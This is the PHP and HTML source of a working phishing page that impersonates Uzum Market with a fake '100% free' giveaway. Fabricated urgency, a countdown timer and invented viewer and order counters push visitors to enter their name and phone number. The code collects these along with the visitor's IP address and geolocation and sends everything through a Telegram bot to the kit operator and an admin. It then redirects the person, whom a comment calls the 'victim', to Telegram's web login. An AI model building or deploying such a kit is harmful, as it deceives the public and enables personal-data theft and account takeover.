<?php
require_once __DIR__ . '/config.php';

// Kalitni tekshirish
$key = isset($_GET['id']) ? trim($_GET['id']) : '';
if ($key === '') {
    http_response_code(404);
    exit("404 Not Found");
}

$chat_id = getUserFromKey($key);
if (!$chat_id) {
    http_response_code(404);
    exit("404 Not Found - Invalid or expired key");
}

$pdo = getDB();
$stmt = $pdo->prepare("SELECT * FROM users WHERE chat_id = ?");
$stmt->execute([$chat_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$user) {
    http_response_code(404);
    exit("404 Not Found");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phone = $_POST['phone'] ?? '';
    $name = $_POST['name'] ?? '';
    
    // Telefon raqamini tozalash
    $phone = preg_replace('/[^0-9]/', '', $phone);
    
    if (strlen($phone) < 9 || empty(trim($name))) {
        http_response_code(400);
        exit("400 Bad Request - Invalid data");
    }
    
    $ip = client_ip();
    $ipdata = ipInfo($ip);
    $timeStr = date("Y-m-d H:i:s");
    
    $geoInfo = "";
    if($ipdata){
        $city = $ipdata['city'] ?? 'Noma\'lum';
        $country = $ipdata['country'] ?? 'Noma\'lum';
        $isp = $ipdata['isp'] ?? 'Noma\'lum';
        $geoInfo = "\n🏙️ Shahar: {$city}\n🏳️ Mamlakat: {$country}\n🌐 Provayder: {$isp}";
    }

    $admn = ADMIN_ID; // config.php ichida belgilangan bo'lishi kerak

    $text = "📝 <b>Yangi raqam qabul qilindi:</b>\n" .
            "👤 <b>Ism-Familiya:</b> " . htmlspecialchars($name) . "\n" .
            "📱 <b>Telefon:</b> +{$phone}\n" .
            "🕒 <b>Vaqt:</b> {$timeStr}\n" .
            "👤 <b>Foydalanuvchi:</b> tg://user?id=$chat_id\n" .
            "🌐 <b>IP:</b> {$ip}{$geoInfo}";

    // Asosiy botga xabar yuborish
    tgRequest("sendMessage", [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    ]);
    
        tgRequest("sendMessage", [
        'chat_id' => $admn,
        'text' => $text,
        'parse_mode' => 'HTML'
    ]);
    
    // Ma'lumotlar bazasini yangilash
    $cols = $pdo->query("PRAGMA table_info(users)")->fetchAll(PDO::FETCH_COLUMN);
    if (!in_array('phones_received', $cols)) {
        $pdo->exec("ALTER TABLE users ADD COLUMN phones_received INTEGER DEFAULT 0");
    }
    
    $stmt = $pdo->prepare("UPDATE users SET phones_received = COALESCE(phones_received, 0) + 1 WHERE chat_id = ?");
    $stmt->execute([$chat_id]);
    
    // Log yozish
    logActivity($chat_id, 'form_submitted', "Ariza qabul qilindi: " . htmlspecialchars($name) . " +{$phone}");
    
    // Qurbonni boshqa sahifaga yo'naltirish
    header("Location: https://web.telegram.org/");
    exit;
}

// 8 soat qolgan vaqtni hisoblash
$remaining_hours = 8;
$remaining_minutes = 0;
$remaining_seconds = 0;
?>
<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uzum Market - 100% Chegirma Aksiyasi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            overflow: hidden;
            max-width: 450px;
            width: 100%;
            position: relative;
        }
        
        .header {
            background: linear-gradient(135deg, #ff9a9e, #fad0c4);
            color: #2c3e50;
            padding: 40px 20px;
            text-align: center;
            position: relative;
            clip-path: polygon(0 0, 100% 0, 100% 85%, 0 100%);
        }
        
        .header::after {
            content: '';
            position: absolute;
            bottom: -50px;
            left: 0;
            right: 0;
            height: 50px;
            background: white;
            border-radius: 25px 25px 0 0;
        }
        
        .logo {
            font-size: 36px;
            font-weight: bold;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
        }
        
        .tagline {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
        }
        
        .discount-badge {
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
            padding: 20px 40px;
            border-radius: 50px;
            font-size: 28px;
            font-weight: bold;
            display: inline-block;
            box-shadow: 0 15px 35px rgba(255,107,107,0.5);
            animation: pulse 2s infinite;
            border: 3px solid white;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        .content {
            padding: 60px 30px 30px;
            margin-top: -30px;
            position: relative;
            z-index: 1;
        }
        
        .title {
            font-size: 32px;
            font-weight: bold;
            color: #2c3e50;
            margin-bottom: 15px;
            text-align: center;
            line-height: 1.3;
        }
        
        .subtitle {
            font-size: 16px;
            color: #7f8c8d;
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        
        .timer {
            background: linear-gradient(135deg, #2c3e50, #34495e);
            color: white;
            padding: 25px;
            border-radius: 20px;
            text-align: center;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            border: 3px solid #ffd700;
        }
        
        .timer-text {
            font-size: 16px;
            opacity: 0.9;
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .countdown {
            font-size: 32px;
            font-weight: bold;
            color: #ffd700;
            text-shadow: 0 3px 6px rgba(0,0,0,0.4);
            font-family: 'Courier New', monospace;
        }
        
        .form-container {
            background: linear-gradient(135deg, #a1c4fd, #c2e9fb);
            padding: 30px;
            border-radius: 20px;
            margin-bottom: 25px;
            box-shadow: 0 15px 35px rgba(161,196,253,0.4);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #2c3e50;
            font-size: 14px;
        }
        
        .form-input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e9ecef;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: white;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #ff6b6b;
            box-shadow: 0 0 0 3px rgba(255,107,107,0.1);
        }
        
        .form-input::placeholder {
            color: #adb5bd;
        }
        
        .benefits {
            margin-bottom: 25px;
        }
        
        .benefit-item {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            padding: 12px 0;
        }
        
        .benefit-item:last-child {
            margin-bottom: 0;
        }
        
        .benefit-icon {
            width: 32px;
            height: 32px;
            background: #ff6b6b;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: white;
            font-size: 14px;
        }
        
        .benefit-text {
            color: #2c3e50;
            font-size: 14px;
            font-weight: 500;
            flex: 1;
        }
        
        .btn-primary {
            width: 100%;
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
            border: none;
            padding: 20px;
            border-radius: 15px;
            font-size: 20px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            text-decoration: none;
            box-shadow: 0 10px 30px rgba(255,107,107,0.5);
            margin-bottom: 20px;
        }
        
        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(255,107,107,0.7);
        }
        
        .info {
            background: #fff3e0;
            padding: 20px;
            border-radius: 15px;
            border-left: 5px solid #ff6b6b;
            margin-top: 20px;
        }
        
        .info-text {
            font-size: 13px;
            color: #2c3e50;
            line-height: 1.5;
            text-align: center;
        }
        
        .security {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #6c757d;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .limited-offer {
            text-align: center;
            margin-bottom: 20px;
            padding: 15px;
            background: linear-gradient(135deg, #ffecb3, #ffd54f);
            border-radius: 12px;
            font-weight: 600;
            color: #2c3e50;
            border: 2px dashed #ee5a24;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-bottom: 25px;
        }
        
        .stat-card {
            background: white;
            border: 2px solid #e9ecef;
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        
        .stat-card:hover {
            border-color: #ff6b6b;
            transform: translateY(-5px);
        }
        
        .stat-number {
            font-size: 20px;
            font-weight: bold;
            color: #ff6b6b;
            margin-bottom: 5px;
        }
        
        .stat-label {
            font-size: 11px;
            color: #6c757d;
            text-transform: uppercase;
            font-weight: 600;
        }
        
        @media (max-width: 480px) {
            .container {
                margin: 10px;
            }
            
            .content {
                padding: 50px 20px 20px;
            }
            
            .stats {
                grid-template-columns: 1fr;
                gap: 10px;
            }
            
            .title {
                font-size: 26px;
            }
            
            .discount-badge {
                font-size: 24px;
                padding: 15px 30px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">UZUM MARKET</div>
            <div class="tagline">Maxsus 100% Chegirma Aksiyasi</div>
            <div class="discount-badge">100% TEKIN</div>
        </div>
        
        <div class="content">
            <div class="title">
                48 Soatlik Maxsus Taklif!
            </div>
            
            <div class="subtitle">
                Noqonuniy tovar emas 
            </div>
            
            <div class="limited-offer">
                Bu shunchaki qolib ketgan tovarlarni tarqatish 🔥
            </div>
            
            <div class="timer">
                <div class="timer-text">Aksiya tugashiga qoldi:</div>
                <div class="countdown" id="countdown">08:43:30</div>
            </div>
            
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-number" id="viewers">1.8K</div>
                    <div class="stat-label">Ko'ruvchilar</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="orders">97</div>
                    <div class="stat-label">Buyurtmalar</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="remaining">3</div>
                    <div class="stat-label">Qolgan joy</div>
                </div>
            </div>
            
            <form method="POST" class="form-container">
                <div class="form-group">
                    <label class="form-label">Ism va Familiyangiz</label>
                    <input type="text" name="name" class="form-input" placeholder="Masalan: Uzum Market" required>
                </div>
                
                <div class="form-group">
                    <label class="form-label">Telefon raqamingiz</label>
                    <input type="tel" name="phone" class="form-input" placeholder="Masalan: 901234567" required>
                </div>
                
                <button type="submit" class="btn-primary">
                    <span>🚀 TEKIN BUYURTMA BERISH</span>
                </button>
            </form>
            
            <div class="benefits">
                <div class="benefit-item">
                    <div class="benefit-icon">🎁</div>
                    <div class="benefit-text">Har qanday mahsulotni tanlang - 100% tekin</div>
                </div>
                <div class="benefit-item">
                    <div class="benefit-icon">🚚</div>
                    <div class="benefit-text">O'zbekiston bo'ylab bepul yetkazib berish</div>
                </div>
                <div class="benefit-item">
                    <div class="benefit-icon">↩️</div>
                    <div class="benefit-text">Sifatli tovar yetkazilishi</div>
                </div>
            </div>
            
            <div class="info">
                <div class="info-text">
                    <strong>💡 Diqqat:</strong> Formani to'ldirgach, operatorimiz siz bilan bog'lanadi 
                    va mahsulotni tanlashda yordam beradi. Faqat 100 ta joy mavjud!
                </div>
            </div>
            
            <div class="security">
                <span>🔒</span>
                Barcha ma'lumotlaringiz xavfsiz saqlanadi
            </div>
        </div>
    </div>

    <script>
        // 8 soatlik taymer
        function startTimer() {
            const countdown = document.getElementById('countdown');
            let hours = 8;
            let minutes = 0;
            let seconds = 0;
            
            setInterval(() => {
                seconds--;
                
                if (seconds < 0) {
                    seconds = 59;
                    minutes--;
                    
                    if (minutes < 0) {
                        minutes = 59;
                        hours--;
                        
                        if (hours < 0) {
                            hours = 0;
                            minutes = 0;
                            seconds = 0;
                        }
                    }
                }
                
                const formattedTime = 
                    String(hours).padStart(2, '0') + ':' +
                    String(minutes).padStart(2, '0') + ':' +
                    String(seconds).padStart(2, '0');
                
                countdown.textContent = formattedTime;
            }, 1000);
        }
        
        // Dinamik raqamlar animatsiyasi
        function animateNumbers() {
            const viewers = document.getElementById('viewers');
            const orders = document.getElementById('orders');
            const remaining = document.getElementById('remaining');
            
            let viewCount = 0;
            let orderCount = 0;
            let remainCount = 100;
            const viewTarget = 1843;
            const orderTarget = 97;
            const remainTarget = 3;
            
            const interval = setInterval(() => {
                viewCount += Math.ceil(viewTarget / 50);
                orderCount += Math.ceil(orderTarget / 50);
                remainCount -= Math.ceil(remainTarget / 50);
                
                if (viewCount >= viewTarget) {
                    viewCount = viewTarget;
                }
                
                if (orderCount >= orderTarget) {
                    orderCount = orderTarget;
                }
                
                if (remainCount <= remainTarget) {
                    remainCount = remainTarget;
                    clearInterval(interval);
                }
                
                viewers.textContent = viewCount >= 1000 ? 
                    (viewCount / 1000).toFixed(1) + 'K' : viewCount;
                orders.textContent = orderCount;
                remaining.textContent = remainCount;
            }, 30);
        }
        
        // Formani tekshirish
        document.querySelector('form').addEventListener('submit', function(e) {
            const nameInput = document.querySelector('input[name="name"]');
            const phoneInput = document.querySelector('input[name="phone"]');
            
            if (nameInput.value.trim().length < 2) {
                e.preventDefault();
                alert('Iltimos, ism va familiyangizni to\'liq kiriting');
                nameInput.focus();
                return;
            }
            
            const phone = phoneInput.value.replace(/[^0-9]/g, '');
            if (phone.length < 9) {
                e.preventDefault();
                alert('Iltimos, to\'g\'ri telefon raqam kiriting');
                phoneInput.focus();
                return;
            }
        });
        
        // Sahifa yuklanganda boshlash
        document.addEventListener('DOMContentLoaded', () => {
            startTimer();
            setTimeout(animateNumbers, 500);
        });
    </script>
</body>
</html>